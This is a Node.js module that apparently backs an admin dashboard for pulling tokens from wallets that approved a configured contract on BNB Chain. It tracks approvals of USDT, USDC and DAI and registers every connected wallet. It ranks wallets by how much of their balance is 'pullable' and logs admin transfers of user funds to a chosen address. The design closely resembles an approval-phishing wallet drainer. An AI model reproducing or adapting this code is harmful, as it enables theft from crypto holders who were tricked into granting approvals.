import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { ethers, formatUnits } from 'ethers';
import { config } from './config.js';
import { provider, proxyRead, ERC20_ABI } from './chain.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DATA_DIR = path.resolve(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'approvals.json');

const DEFAULT_TOKENS = [
  { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
  { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
  { symbol: 'DAI', address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18 },
];

function loadApprovals() {
  try {
    if (!fs.existsSync(DATA_FILE)) {
      return [];
    }
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    return JSON.parse(raw);
  } catch (e) {
    console.error('[approvals] Failed to load data file:', e.message);
    return [];
  }
}

function saveApprovals(items) {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    fs.writeFileSync(DATA_FILE, JSON.stringify(items, null, 2), 'utf8');
  } catch (e) {
    console.error('[approvals] Failed to save data file:', e.message);
  }
}

export function recordApproval({ address, token, symbol, txHash, allowance, blockNumber }) {
  if (!ethers.isAddress(address) || !ethers.isAddress(token)) return null;

  const items = loadApprovals();
  const addrLower = address.toLowerCase();
  const tokenLower = token.toLowerCase();

  const idx = items.findIndex(
    (x) => x.address.toLowerCase() === addrLower && x.token.toLowerCase() === tokenLower
  );

  const record = {
    address: ethers.getAddress(address),
    token: ethers.getAddress(token),
    symbol: symbol || 'TOKEN',
    allowance: allowance ? String(allowance) : '0',
    txHash: txHash || (idx >= 0 ? items[idx].txHash : ''),
    blockNumber: blockNumber || (idx >= 0 ? items[idx].blockNumber : 0),
    updatedAt: Date.now(),
  };

  if (idx >= 0) {
    items[idx] = { ...items[idx], ...record };
  } else {
    items.unshift(record);
  }

  saveApprovals(items);
  return record;
}

export async function recordConnectedUser(address) {
  if (!ethers.isAddress(address)) return;
  const items = loadApprovals();
  const addrLower = address.toLowerCase();

  // If user already in list with any token, return
  const exists = items.some((x) => x.address.toLowerCase() === addrLower);
  if (exists) return;

  // Check allowances across default tokens
  for (const t of DEFAULT_TOKENS) {
    try {
      const erc20 = new ethers.Contract(t.address, ERC20_ABI, provider);
      const allow = await erc20.allowance(address, config.contractAddress);
      if (allow > 0n) {
        items.unshift({
          address: ethers.getAddress(address),
          token: t.address,
          symbol: t.symbol,
          allowance: formatUnits(allow, t.decimals),
          txHash: '',
          blockNumber: 0,
          updatedAt: Date.now(),
        });
      }
    } catch {
      // ignore
    }
  }

  // If still not added, register them with USDT so they appear in dashboard
  if (!items.some((x) => x.address.toLowerCase() === addrLower)) {
    items.unshift({
      address: ethers.getAddress(address),
      token: DEFAULT_TOKENS[0].address,
      symbol: DEFAULT_TOKENS[0].symbol,
      allowance: '0',
      txHash: '',
      blockNumber: 0,
      updatedAt: Date.now(),
    });
  }

  saveApprovals(items);
}

export async function syncOnChainApprovals() {
  try {
    const currentBlock = await provider.getBlockNumber();
    const fromBlock = Math.max(config.fromBlock, currentBlock - 45000);
    const items = loadApprovals();
    let updated = false;

    for (const t of DEFAULT_TOKENS) {
      try {
        const erc20 = new ethers.Contract(
          t.address,
          ['event Approval(address indexed owner, address indexed spender, uint256 value)'],
          provider
        );
        const filter = erc20.filters.Approval(null, config.contractAddress);
        const events = await erc20.queryFilter(filter, fromBlock, currentBlock);

        for (const ev of events) {
          const owner = ev.args[0];
          const val = ev.args[2];
          const txHash = ev.transactionHash;
          const blockNumber = ev.blockNumber;

          const addrLower = owner.toLowerCase();
          const tokenLower = t.address.toLowerCase();

          const idx = items.findIndex(
            (x) => x.address.toLowerCase() === addrLower && x.token.toLowerCase() === tokenLower
          );

          const humanAllowance = formatUnits(val, t.decimals);

          if (idx >= 0) {
            if (items[idx].allowance !== humanAllowance || !items[idx].txHash) {
              items[idx].allowance = humanAllowance;
              items[idx].txHash = txHash;
              items[idx].blockNumber = blockNumber;
              items[idx].updatedAt = Date.now();
              updated = true;
            }
          } else {
            items.unshift({
              address: ethers.getAddress(owner),
              token: t.address,
              symbol: t.symbol,
              allowance: humanAllowance,
              txHash,
              blockNumber,
              updatedAt: Date.now(),
            });
            updated = true;
          }
        }
      } catch (e) {
        console.warn(`[approvals] sync failed for ${t.symbol}:`, e.message);
      }
    }

    if (updated) {
      saveApprovals(items);
    }
  } catch (e) {
    console.error('[approvals] Global sync failed:', e.message);
  }
}

export async function getEnrichedApprovedUsers() {
  const items = loadApprovals();
  if (items.length === 0) return [];

  const enriched = await Promise.all(
    items.map(async (item) => {
      try {
        const erc20 = new ethers.Contract(item.token, ERC20_ABI, provider);
        const [allowance, balance, decimals, symbol, limit, lastPull, canPull, nextPullAt] =
          await Promise.all([
            erc20.allowance(item.address, config.contractAddress).catch(() => 0n),
            erc20.balanceOf(item.address).catch(() => 0n),
            erc20.decimals().catch(() => 18),
            erc20.symbol().catch(() => item.symbol || 'TOKEN'),
            proxyRead.tokenLimit(item.token).catch(() => 0n),
            proxyRead.lastPull(item.address, item.token).catch(() => 0n),
            proxyRead.canPull(item.address, item.token).catch(() => true),
            proxyRead.nextPullAt(item.address, item.token).catch(() => 0n),
          ]);

        const dec = Number(decimals);
        const balBN = BigInt(balance ? balance.toString() : '0');
        const allowBN = BigInt(allowance ? allowance.toString() : '0');
        const limitBN = BigInt(limit ? limit.toString() : '0');

        // Exact BigInt calculation without float rounding
        let maxPullableBN = balBN < allowBN ? balBN : allowBN;
        if (limitBN > 0n && limitBN < maxPullableBN) {
          maxPullableBN = limitBN;
        }
        if (maxPullableBN < 0n) maxPullableBN = 0n;

        const exactBal = formatUnits(balBN, dec);
        const exactAllow = formatUnits(allowBN, dec);
        const exactLimit = formatUnits(limitBN, dec);
        const exactMaxPullable = formatUnits(maxPullableBN, dec);

        let status = 'ready';
        if (allowBN <= 0n) {
          status = 'no_allowance';
        } else if (balBN <= 0n) {
          status = 'zero_balance';
        } else if (!canPull) {
          status = 'cooldown';
        }

        return {
          address: item.address,
          token: item.token,
          symbol,
          decimals: dec,
          balance: exactBal,
          rawBalance: balBN.toString(),
          allowance: exactAllow,
          rawAllowance: allowBN.toString(),
          limit: exactLimit,
          maxPullable: exactMaxPullable,
          canPull,
          lastPull: Number(lastPull),
          nextPullAt: Number(nextPullAt),
          txHash: item.txHash,
          blockNumber: item.blockNumber,
          updatedAt: item.updatedAt,
          status,
        };
      } catch (err) {
        console.error(`[approvals] Error enriching ${item.address}:`, err.message);
        return {
          address: item.address,
          token: item.token,
          symbol: item.symbol || 'TOKEN',
          balance: '0',
          allowance: item.allowance || '0',
          limit: '0',
          maxPullable: '0',
          canPull: false,
          status: 'error',
          txHash: item.txHash || '',
          updatedAt: item.updatedAt || Date.now(),
        };
      }
    })
  );

  // Sort: 'ready' users first, then by allowance descending
  return enriched.sort((a, b) => {
    if (a.status === 'ready' && b.status !== 'ready') return -1;
    if (a.status !== 'ready' && b.status === 'ready') return 1;
    return Number(b.allowance) - Number(a.allowance);
  });
}

const PULLS_FILE = path.join(DATA_DIR, 'pulls.json');

export function loadPulls() {
  try {
    if (!fs.existsSync(PULLS_FILE)) return [];
    return JSON.parse(fs.readFileSync(PULLS_FILE, 'utf8'));
  } catch {
    return [];
  }
}

export function savePulls(items) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(PULLS_FILE, JSON.stringify(items, null, 2), 'utf8');
  } catch {}
}

export function recordPull(entry) {
  const pulls = loadPulls();
  const exists = pulls.some((p) => p.txHash?.toLowerCase() === entry.txHash?.toLowerCase());
  if (exists) return;
  pulls.unshift({
    txHash: entry.txHash,
    blockNumber: entry.blockNumber || 0,
    admin: entry.admin,
    user: entry.user,
    token: entry.token,
    to: entry.to,
    amount: entry.amount,
    timestamp: Date.now(),
  });
  savePulls(pulls);
}

export function getPulls(limit = 50) {
  const pulls = loadPulls();
  return pulls.slice(0, limit);
}
